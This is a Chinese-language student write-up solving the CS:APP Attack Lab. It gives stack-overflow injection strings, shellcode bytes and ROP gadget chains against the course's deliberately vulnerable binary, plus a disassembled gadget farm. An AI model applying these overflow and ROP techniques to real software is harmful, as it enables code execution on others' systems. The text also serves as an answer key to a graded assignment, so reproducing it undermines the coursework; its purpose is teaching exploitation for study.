# Attacklab实验

[TOC]

## 写在前面

这是随机生成的一个lab，基本思路与练习一致，如果想要浏览更多细节和思路，请查阅[attacklab-practice](attacklab-practice.md)

## Part1：Code Injection Attacks

### level1实战

获取touch1地址：0x401884
获取getbuf开辟空间：0x38 (56)
答案：

```c
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
84 18 40 00
```

### level2实战

首先获取touch2首地址：0x004018b2
获取cookie：0x55daf469
注入代码如下：

```c
    movq    $0x55daf469, %rdi
    pushq   $0x4018b2
    ret
```

获得指令序列：

```c
0: 48 c7 c7 69 f4 da 55  mov    $0x55daf469,%rdi
7: 68 b2 18 40 00        pushq  $0x4018b2
c: c3                    retq
```

再获取到进入getbuf函数后的rsp的地址：0x55676d78
所以最终结果如下：

```c
48 c7 c7 69 f4 da 55 68
b2 18 40 00 c3 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
78 6d 67 55
```

### level3实战

首先获取touch3地址：0x4019c9，将我们的cookie（0x55daf469）转化为asc2码表示：`35 35 64 61 66 34 36 39`

同level3的思路，我们直接把字串放到test的栈帧中，获取到test的rsp地址：0x55676db8（之前的rsp+0x40）

所以生成我们的注入代码即对应指令串

```c
    movq    $0x55676db8, %rdi
    pushq   $0x4019c9
    ret
    // 翻译后的指令为：
    0: 48 c7 c7 b8 6d 67 55  mov    $0x55676db8,%rdi
    7: 68 c9 19 40 00        pushq  $0x4019c9
    c: c3                    ret
```

所以最终输入结果如下：

```c
48 c7 c7 b8 6d 67 55 68
c9 19 40 00 c3 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
78 6d 67 55 00 00 00 00
35 35 64 61 66 34 36 39
```

## Part2: Return-Oriented Programming

在进入level4之前，我们先认识一下Return-Oriented Programming（ROP）
一般程序都有开启**栈随机化**与栈保护（不能执行栈内代码），因此之前的方法不再适用。
所以我们便需要转换思路，利用现有程序中的代码。
例如，我们有下列代码：

```c
void setval_210(unsigned *p)
{
*p = 3347663060U;
}
//进行编译……
400f15: c7 07 d4 48 89 c7 movl $0xc78948d4,(%rdi)
400f1b: c3 retq
```

注意到**48 89 c7**为 movq %rax, %rdi.
因此，如果我们从400f18开始执行的话，相当于执行了

```c
movq %rax, %rdi
retq
```

这种可以利用的代码称为**gadget**，利用gadgets我们可以实现对程序的攻击

### level4实战

我们的方式为：

```c
popq %rax               //58
moveq %rax, %rdi        //48 89 c7
ret
```

首先反编译出farm，然后在farm中找到`58 c3`:401a9b
然后找`48 89 c7 c3`:401a90
获取touch2地址：4018b2
所以根据cookie：0x55daf469生成答案：

```c
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
9b 1a 40 00 00 00 00 00
69 f4 da 55 00 00 00 00
90 1a 40 00 00 00 00 00
b2 18 40 00 00 00 00 00
```

### level5实战

首先获取farm，存储在附录中。解决方案同level5

```c
1. movq %rsp, %rax    // 48 89 e0   0x401b62  注意之后每一个都有个返回
2. movq %rax, %rdi    // 48 89 c7   0x401a75
3. 在缓冲区存放string偏移量，并popq %rax    // 58   0x401a9b
4. movl %eax, %edx    // 89 c2    0x401af0  注意到这后面还有一个92指令，不过不影响
5. movl %edx, %ecx    // 89 d1    0x401b68  注意到这里后面还有一个38 db的指令才到c3，不过不会对我们造成影响
6. movl %ecx, %esi    // 89 ce    0x401b7e
7. lea (%rdi, %rsi, 1), %rax      // 48 8d 04 37    0x401aa6
8. movq %rax,%rdi     // 48 89 c7   0x401a75
```

获取到touch3：`0x4019c9`，cookie的asc2表示：`35 35 64 61 66 34 36 39`

所以生成结果：

```c
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
62 1b 40 00 00 00 00 00     // 进入0x401b62执行movq %rsp, %rax，之后返回在下一条指令
75 1a 40 00 00 00 00 00     // 进入0x401a75执行movq %rax, %rdi，**初始rsp也在这里**
9b 1a 40 00 00 00 00 00     // 进入0x401a9b执行popq %rax，弹出我们的string偏移量后再返回
48 00 00 00 00 00 00 00     // 我们的string偏移量，注意我们存rsp的位置（此处+0x10）
f0 1a 40 00 00 00 00 00     // 进入0x401af0执行movl %eax, %edx，之后返回
68 1b 40 00 00 00 00 00     // 进入0x401b68执行movl %edx, %ecx，之后返回（此处+0x20）
7e 1b 40 00 00 00 00 00     // 进入0x401b7e执行movl %ecx, %esi，之后返回
a6 1a 40 00 00 00 00 00     // 进入0x401aa6执行lea (%rdi, %rsi, 1), %rax，之后返回（此处+0x30）
75 1a 40 00 00 00 00 00     // 进入0x401a75执行movq %rax,%rdi，之后返回+0x8
c9 19 40 00 00 00 00 00     // 进入0x4019c9执行touch3 注意这里不是callq所以没有压栈，此时（此处+0x40）
35 35 64 61 66 34 36 39     // 我们的string（此处+0x48，所以得到偏移量为48）
```

### 附录：实战farm

```c++
0000000000401a66 <start_farm>:
  401a66:       b8 01 00 00 00          mov    $0x1,%eax
  401a6b:       c3                      retq
0000000000401a6c <setval_296>:
  401a6c:       c7 07 58 90 c3 44       movl   $0x44c39058,(%rdi)
  401a72:       c3                      retq
0000000000401a73 <addval_429>:
  401a73:       8d 87 48 89 c7 c3       lea    -0x3c3876b8(%rdi),%eax
  401a79:       c3                      retq
0000000000401a7a <setval_320>:
  401a7a:       c7 07 48 99 c7 c3       movl   $0xc3c79948,(%rdi)
  401a80:       c3                      retq
0000000000401a81 <getval_237>:
  401a81:       b8 48 89 c7 94          mov    $0x94c78948,%eax
  401a86:       c3                      retq
0000000000401a87 <setval_497>:
  401a87:       c7 07 d1 48 90 c3       movl   $0xc39048d1,(%rdi)
  401a8d:       c3                      retq
0000000000401a8e <getval_333>:
  401a8e:       b8 68 48 89 c7          mov    $0xc7894868,%eax
  401a93:       c3                      retq
0000000000401a94 <getval_321>:
  401a94:       b8 e2 12 18 90          mov    $0x901812e2,%eax
  401a99:       c3                      retq
0000000000401a9a <getval_490>:
  401a9a:       b8 58 90 90 90          mov    $0x90909058,%eax
  401a9f:       c3                      retq
0000000000401aa0 <mid_farm>:
  401aa0:       b8 01 00 00 00          mov    $0x1,%eax
  401aa5:       c3                      retq
0000000000401aa6 <add_xy>:
  401aa6:       48 8d 04 37             lea    (%rdi,%rsi,1),%rax
  401aaa:       c3                      retq
0000000000401aab <getval_463>:
  401aab:       b8 48 89 e0 c1          mov    $0xc1e08948,%eax
  401ab0:       c3                      retq
0000000000401ab1 <addval_460>:
  401ab1:       8d 87 a9 d1 90 c3       lea    -0x3c6f2e57(%rdi),%eax
  401ab7:       c3                      retq
0000000000401ab8 <setval_212>:
  401ab8:       c7 07 89 c2 38 db       movl   $0xdb38c289,(%rdi)
  401abe:       c3                      retq
0000000000401abf <addval_341>:
  401abf:       8d 87 89 d1 c1 ff       lea    -0x3e2e77(%rdi),%eax
  401ac5:       c3                      retq
0000000000401ac6 <getval_400>:
  401ac6:       b8 48 89 e0 c2          mov    $0xc2e08948,%eax
  401acb:       c3                      retq
0000000000401acc <addval_173>:
  401acc:       8d 87 8d ce 38 d2       lea    -0x2dc73173(%rdi),%eax
  401ad2:       c3                      retq
0000000000401ad3 <getval_499>:
  401ad3:       b8 59 48 8d e0          mov    $0xe08d4859,%eax
  401ad8:       c3                      retq
0000000000401ad9 <setval_363>:
  401ad9:       c7 07 48 89 e0 91       movl   $0x91e08948,(%rdi)
  401adf:       c3                      retq
0000000000401ae0 <addval_438>:
  401ae0:       8d 87 89 d1 38 c0       lea    -0x3fc72e77(%rdi),%eax
  401ae6:       c3                      retq
0000000000401ae7 <setval_181>:
  401ae7:       c7 07 48 89 e0 c3       movl   $0xc3e08948,(%rdi)
  401aed:       c3                      retq
0000000000401aee <addval_439>:
  401aee:       8d 87 89 c2 92 90       lea    -0x6f6d3d77(%rdi),%eax
  401af4:       c3                      retq
0000000000401af5 <addval_472>:
  401af5:       8d 87 89 ce 28 c9       lea    -0x36d73177(%rdi),%eax
  401afb:       c3                      retq
0000000000401afc <setval_199>:
  401afc:       c7 07 89 c2 20 c9       movl   $0xc920c289,(%rdi)
  401b02:       c3                      retq
0000000000401b03 <getval_457>:
  401b03:       b8 48 99 e0 c3          mov    $0xc3e09948,%eax
  401b08:       c3                      retq
0000000000401b09 <addval_107>:
  401b09:       8d 87 99 ce 90 c3       lea    -0x3c6f3167(%rdi),%eax
  401b0f:       c3                      retq
0000000000401b10 <getval_239>:
  401b10:       b8 89 c2 c1 a9          mov    $0xa9c1c289,%eax
  401b15:       c3                      retq
0000000000401b16 <getval_334>:
  401b16:       b8 89 d1 a4 c0          mov    $0xc0a4d189,%eax
  401b1b:       c3                      retq
0000000000401b1c <setval_473>:
  401b1c:       c7 07 89 ce 38 c0       movl   $0xc038ce89,(%rdi)
  401b22:       c3                      retq
0000000000401b23 <getval_189>:
  401b23:       b8 48 89 e0 91          mov    $0x91e08948,%eax
  401b28:       c3                      retq
0000000000401b29 <setval_318>:
  401b29:       c7 07 88 ce c3 32       movl   $0x32c3ce88,(%rdi)
  401b2f:       c3                      retq
0000000000401b30 <getval_447>:
  401b30:       b8 db 89 ce c2          mov    $0xc2ce89db,%eax
  401b35:       c3                      retq
0000000000401b36 <setval_399>:
  401b36:       c7 07 81 d1 08 c0       movl   $0xc008d181,(%rdi)
  401b3c:       c3                      retq
0000000000401b3d <setval_453>:
  401b3d:       c7 07 89 d1 00 c9       movl   $0xc900d189,(%rdi)
  401b43:       c3                      retq
0000000000401b44 <addval_380>:
  401b44:       8d 87 89 c2 c1 52       lea    0x52c1c289(%rdi),%eax
  401b4a:       c3                      retq
0000000000401b4b <addval_131>:
  401b4b:       8d 87 99 c2 20 c0       lea    -0x3fdf3d67(%rdi),%eax
  401b51:       c3                      retq
0000000000401b52 <getval_183>:
  401b52:       b8 8b ce 84 d2          mov    $0xd284ce8b,%eax
  401b57:       c3                      retq
0000000000401b58 <setval_414>:
  401b58:       c7 07 8b d1 20 d2       movl   $0xd220d18b,(%rdi)
  401b5e:       c3                      retq
0000000000401b5f <addval_228>:
  401b5f:       8d 87 62 48 89 e0       lea    -0x1f76b79e(%rdi),%eax
  401b65:       c3                      retq
0000000000401b66 <addval_235>:
  401b66:       8d 87 89 d1 38 db       lea    -0x24c72e77(%rdi),%eax
  401b6c:       c3                      retq
0000000000401b6d <setval_338>:
  401b6d:       c7 07 81 c2 20 c9       movl   $0xc920c281,(%rdi)
  401b73:       c3                      retq
0000000000401b74 <setval_241>:
  401b74:       c7 07 d0 81 c2 90       movl   $0x90c281d0,(%rdi)
  401b7a:       c3                      retq
0000000000401b7b <addval_132>:
  401b7b:       8d 87 52 89 ce c3       lea    -0x3c3176ae(%rdi),%eax
  401b81:       c3                      retq
0000000000401b82 <end_farm>:
  401b82:       b8 01 00 00 00          mov    $0x1,%eax
  401b87:       c3                      retq
```
